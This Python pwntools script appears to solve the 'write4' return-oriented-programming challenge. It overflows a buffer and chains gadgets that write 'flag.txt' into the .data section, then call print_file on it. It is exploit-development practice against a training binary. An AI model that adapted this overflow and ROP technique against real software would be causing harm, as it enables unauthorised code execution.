from pwn import *

context.binary = "./write4"
context.terminal = ["tmux", "splitw", "-h"]
elf = ELF("./write4")

print_file_plt = elf.plt["print_file"]
usefulGadget = elf.symbols["usefulGadgets"]

location_for_evil_string = elf.get_section_by_name(
    ".data"
).header.sh_addr  # writable .data section
pop_r14_r15_gadget = 0x400690
pop_rdi_gadget = 0x400693
ret_gadget = 0x4004E6

evil_string = p64(0x7478742E67616C66)
p = pwnlib.gdb.debug("./write4")

payload = b"A" * 40  # fill the buffer + RBP
# we basically gotta fill r14 with the location for the evil string and r15 with the string itself
# then we gotta call print_file with rdi holding the location for evil string
payload += p64(pop_r14_r15_gadget)  # load the data into the regs
payload += p64(location_for_evil_string)  # r14
payload += evil_string  # r15

payload += p64(usefulGadget)

payload += p64(pop_rdi_gadget)  # ret goes here -> rdi loads w location of evil
payload += p64(location_for_evil_string)  # rdi

payload += p64(ret_gadget)

payload += p64(print_file_plt)  # ret goes here -> call print_file(0x601028)

p.sendline(payload)
p.interactive()
